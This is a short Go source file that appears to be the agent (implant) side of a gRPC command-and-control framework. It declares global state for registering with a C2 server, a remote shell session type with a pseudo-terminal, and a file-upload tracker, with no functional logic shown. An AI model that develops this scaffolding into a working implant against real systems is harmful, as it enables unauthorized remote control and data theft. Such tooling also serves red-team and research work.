package main

import (
	"errors"
	"io"
	"os"
	"os/exec"
	"sync"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
)

var (
	sessionMu    sync.RWMutex
	agentID      string
	agentClient  pb.AgentServiceClient
	outputClient pb.OutputServiceClient
	startTime    = time.Now()
	headlessMode bool
)

type shellSession struct {
	cmd    *exec.Cmd
	ptmx   *os.File
	stdin  io.WriteCloser
	stdout io.ReadCloser
}

type uploadTarget struct {
	file             *os.File
	path             string
	totalBytes       int64
	transferredBytes int64
}

var errAgentAlreadyRegistered = errors.New("agent already registered")
